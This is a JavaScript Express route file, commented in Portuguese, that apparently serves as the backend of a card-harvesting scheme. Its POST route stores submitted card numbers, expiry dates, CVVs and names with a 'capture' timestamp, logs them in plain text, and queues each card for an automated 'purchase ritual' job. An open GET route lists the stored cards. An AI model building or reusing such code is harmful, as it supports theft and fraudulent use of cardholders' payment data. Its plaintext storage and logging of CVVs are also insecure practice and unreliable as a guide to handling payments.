const express = require('express');
const router = express.Router();
const Cartao = require('../models/Cartao');
const filaCartoes = require('../queue'); // ⚠️ IMPORTANTE: Enfileirador

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao,
      dataCaptura: new Date()
    });

    await novoCartao.save();
    console.log("🩸 Dado injetado no abismo:", novoCartao);

    // ⚠️ ENFIA NA FILA SATÂNICA DO REDIS
    await filaCartoes.add('compra', {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    });

    console.log("🎯 Job enfileirado para o ritual de compra.");

    res.json({ status: 'ok' });
  } catch (err) {
    console.error("💀 Erro na salvação:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});


// GET dos cartões salvos
router.get('/cartoes', async (req, res) => {
  try {
    const cartoes = await Cartao.find().sort({ dataCaptura: -1 }).limit(100);
    res.json(cartoes);
  } catch (err) {
    console.error("💀 Erro ao buscar cartões:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});


module.exports = router;
